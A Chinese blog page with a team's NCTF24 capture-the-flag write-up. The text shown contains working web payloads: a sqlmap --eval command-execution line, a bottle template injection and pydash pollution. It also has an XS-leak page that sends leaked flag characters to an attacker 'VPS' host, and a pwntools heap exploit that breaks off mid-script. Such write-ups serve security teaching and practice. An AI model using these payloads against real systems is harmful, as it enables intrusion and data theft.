<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="不知道"><meta name="copyright" content="不知道"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>NCTF24 不知道 WP | 不知道のblog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/unknown.jpg"><link rel="mask-icon" href="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/unknown.jpg" color="#6200ee"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"example.com","root":"/","title":"不知道的小站","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="战队名：不知道排名：6 成员：LamentXU、Jerrythepro123、lianjin、Liv WEBsqlmap-master签到题。 sqlmap有个–exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕 payload：  127.0.0.1?id&#x3D;1 –eval&#x3D;exec(bytes.fromhex(‘5F5F696D706F72">
<meta property="og:type" content="article">
<meta property="og:title" content="NCTF24 不知道 WP">
<meta property="og:url" content="http://example.com/2025/04/14/NCTF24-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/index.html">
<meta property="og:site_name" content="不知道のblog">
<meta property="og:description" content="战队名：不知道排名：6 成员：LamentXU、Jerrythepro123、lianjin、Liv WEBsqlmap-master签到题。 sqlmap有个–exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕 payload：  127.0.0.1?id&#x3D;1 –eval&#x3D;exec(bytes.fromhex(‘5F5F696D706F72">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png">
<meta property="og:image" content="http://example.com/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png">
<meta property="og:image" content="http://example.com/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png">
<meta property="og:image" content="http://example.com/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png">
<meta property="og:image" content="http://example.com/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png">
<meta property="og:image" content="http://example.com/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png">
<meta property="og:image" content="http://example.com/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png">
<meta property="og:image" content="http://example.com/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png">
<meta property="og:image" content="http://example.com/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png">
<meta property="og:image" content="http://example.com/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png">
<meta property="og:image" content="http://example.com/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png">
<meta property="og:image" content="http://example.com/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png">
<meta property="og:image" content="http://example.com/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png">
<meta property="og:image" content="http://example.com/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png">
<meta property="og:image" content="http://example.com/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png">
<meta property="og:image" content="http://example.com/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png">
<meta property="og:image" content="http://example.com/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png">
<meta property="og:image" content="http://example.com/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png">
<meta property="og:image" content="http://example.com/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png">
<meta property="og:image" content="http://example.com/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png">
<meta property="og:image" content="http://example.com/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png">
<meta property="og:image" content="http://example.com/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png">
<meta property="og:image" content="http://example.com/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png">
<meta property="og:image" content="http://example.com/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png">
<meta property="og:image" content="http://example.com/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png">
<meta property="og:image" content="http://example.com/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png">
<meta property="og:image" content="http://example.com/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png">
<meta property="article:published_time" content="2025-04-14T10:13:44.000Z">
<meta property="article:modified_time" content="2025-04-14T10:48:51.005Z">
<meta property="article:author" content="不知道">
<meta property="article:tag" content="cry">
<meta property="article:tag" content="web">
<meta property="article:tag" content="re">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="不知道"><img width="96" loading="lazy" src="https://img.picui.cn/free/2025/04/13/67fbcc5bc96f6.png" alt="不知道"></a><div class="site-author-name"><a href="/about/">不知道</a></div><a class="site-name" href="/about/site.html">不知道のblog</a><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">1</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%98%E9%98%9F%E5%90%8D%EF%BC%9A%E4%B8%8D%E7%9F%A5%E9%81%93"><span class="toc-number">1.</span> <span class="toc-text">战队名：不知道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-master"><span class="toc-number">1.2.1.</span> <span class="toc-text">sqlmap-master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-dash"><span class="toc-number">1.2.2.</span> <span class="toc-text">ez_dash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-dash-revenge"><span class="toc-number">1.2.3.</span> <span class="toc-text">ez_dash_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#internal-api"><span class="toc-number">1.2.4.</span> <span class="toc-text">internal_api</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">1.3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unauth-diary"><span class="toc-number">1.3.1.</span> <span class="toc-text">unauth-diary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">1.4.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezDOS"><span class="toc-number">1.4.1.</span> <span class="toc-text">ezDOS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SafeProgram"><span class="toc-number">1.4.2.</span> <span class="toc-text">SafeProgram</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gogo"><span class="toc-number">1.4.3.</span> <span class="toc-text">gogo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.5.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#X1crypsc"><span class="toc-number">1.5.1.</span> <span class="toc-text">X1crypsc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QRcode-Reconstruction"><span class="toc-number">1.5.2.</span> <span class="toc-text">QRcode Reconstruction</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.6.</span> <span class="toc-text">CRYPTO</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#6200ee;"><link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/NCTF24-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="不知道"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="不知道のblog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">NCTF24 不知道 WP</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-04-14 18:13:44" itemprop="dateCreated datePublished" datetime="2025-04-14T18:13:44+08:00">2025-04-14</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/wp/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">wp</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/cry/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">cry</span></a><a class="tag-item" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web</span></a><a class="tag-item" href="/tags/re/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">re</span></a><a class="tag-item" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pwn</span></a><a class="tag-item" href="/tags/misc/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">misc</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="战队名：不知道"><a href="#战队名：不知道" class="headerlink" title="战队名：不知道"></a>战队名：不知道</h1><p><strong>排名：6</strong></p>
<p>成员：LamentXU、Jerrythepro123、lianjin、Liv</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png" loading="lazy"></h2><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h3><p>签到题。</p>
<p>sqlmap有个–exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕</p>
<p>payload：</p>
<blockquote>
<p>127.0.0.1?id&#x3D;1 –eval&#x3D;exec(bytes.fromhex(‘5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729’))</p>
</blockquote>
<h3 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a>ez_dash</h3><p>我是第一个报告非预期的（大声）</p>
<p>根本不需要污染。bottle里&lt;%也可以执行，waf没禁完。</p>
<p>直接打abort回显。秒了。</p>
<blockquote>
<p>GET &#x2F;render?path&#x3D;&lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa&#x3D;getoutput(“env”)%0aabort(404,a)%20%&gt;</p>
</blockquote>
<h3 id="ez-dash-revenge"><a href="#ez-dash-revenge" class="headerlink" title="ez_dash_revenge"></a>ez_dash_revenge</h3><p>首先污染掉pydash的helpers.RESTRICTED_KEYS，不然拿不到__globals__</p>
<blockquote>
<p>POST &#x2F;setValue?name&#x3D;pydash HTTP&#x2F;1.1</p>
<p>{</p>
<p>“path”: “helpers.RESTRICTED_KEYS”,</p>
<p>“value”: “123”</p>
<p>}</p>
</blockquote>
<p>然后setval找globals找bottle。改templete的路径，加一个&#x2F;proc&#x2F;self</p>
<blockquote>
<p>POST &#x2F;setValue?name&#x3D;setval HTTP&#x2F;1.1</p>
<p>{</p>
<p>“path”: “<strong>globals</strong>.bottle.TEMPLATE_PATH”,</p>
<p>“value”: [“.&#x2F;“,”.&#x2F;views&#x2F;“,</p>
<pre><code>&quot;/proc/self/&quot;
</code></pre>
<p>]</p>
<p>}</p>
</blockquote>
<p>随后直接render?path&#x3D;environ即可</p>
<h3 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h3><p>XS_leak，通过请求码来泄露。</p>
<p>exp：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Error-Based Attack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">let</span> currentFlag <span class="token operator">=</span> <span class="token string">"nctf&#123;"</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> chars <span class="token operator">=</span> <span class="token string">"abcdef0123456789-&#123;&#125;"</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">checkCharacter</span><span class="token punctuation">(</span><span class="token parameter">char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://0.0.0.0:8000/internal/search?s=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>currentFlag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>

                script<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                    document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

                script<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                    document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

                document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>currentFlag<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">const</span> isCorrect <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">checkCharacter</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>isCorrect<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            currentFlag <span class="token operator">+=</span> char<span class="token punctuation">;</span>
                            window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://VPS:8000/?flag=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>currentFlag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">break</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://VPS:8000/?error=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>currentFlag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>VPS起这个服务，bot访问即可</p>
<p><img src="/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png" loading="lazy"></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="unauth-diary"><a href="#unauth-diary" class="headerlink" title="unauth-diary"></a>unauth-diary</h3><p>先创造largebin来泄漏libc和堆地址，之后创造一个大小为-1的堆块，这样可以溢出来打tcache poisioning。用stdout结构体打house of apple来调用setcontext来写rop。rop用dup2来改输入输出的fd，这样就能拿到shell了。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("")</span>
<span class="token comment">#io=remote("localhost",9999)</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"39.106.16.204"</span><span class="token punctuation">,</span> <span class="token number">33245</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
